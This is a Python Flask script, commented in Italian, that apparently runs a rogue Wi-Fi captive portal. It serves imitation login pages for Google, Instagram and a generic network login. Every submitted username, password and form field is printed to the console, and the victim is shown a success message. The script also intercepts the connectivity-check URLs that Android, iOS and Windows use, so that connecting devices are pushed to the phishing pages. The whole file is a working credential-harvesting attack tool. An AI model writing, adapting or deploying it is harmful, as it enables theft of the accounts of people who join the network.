from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

# -----------------------
# PAGINA PRINCIPALE
# -----------------------


@app.route("/")
def index():
    return render_template("login.html")


# -----------------------
# LOGIN NORMALE
# -----------------------


@app.route("/login", methods=["GET", "POST"])
def login():

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")

        print("\n=== LOGIN RICEVUTO ===")
        print("Username:", username)
        print("Password:", password)
        print("======================\n")

        return "<h2>Connessione riuscita ✅</h2>"

    return render_template("login.html")


# -----------------------
# GOOGLE LOGIN
# -----------------------


@app.route("/google", methods=["GET", "POST"])
def google_login():

    if request.method == "POST":
        print("\n=== LOGIN GOOGLE ===")
        print(request.form)
        print("====================\n")
        return "<h3>Accesso Google ✅</h3>"

    return render_template("google.html")


# -----------------------
# INSTAGRAM LOGIN
# -----------------------


@app.route("/instagram", methods=["GET", "POST"])
def instagram_login():

    if request.method == "POST":
        print("\n=== LOGIN INSTAGRAM ===")
        print(request.form)
        print("=======================\n")
        return "<h3>Accesso Instagram ✅</h3>"

    return render_template("instagram.html")


# -----------------------
# CAPTIVE PORTAL TRIGGERS
# -----------------------

# Android
@app.route("/generate_204")
def android():
    return redirect(url_for("login"))

@app.route("/gen_204")
def gen204():
    return redirect(url_for("login"))

# iOS
@app.route("/hotspot-detect.html")
def ios():
    return redirect(url_for("login"))

# Windows
@app.route("/ncsi.txt")
def windows():
    return redirect(url_for("login"))

#Altri
@app.route("/connecttest.txt")
def connecttest():
    return redirect(url_for("login"))


# -----------------------
# AVVIO SERVER
# -----------------------


if __name__ == "__main__":
    print("\n=== CAPTIVE PORTAL ATTIVO ===\n")
    app.run(host="0.0.0.0", port=80, debug=False)
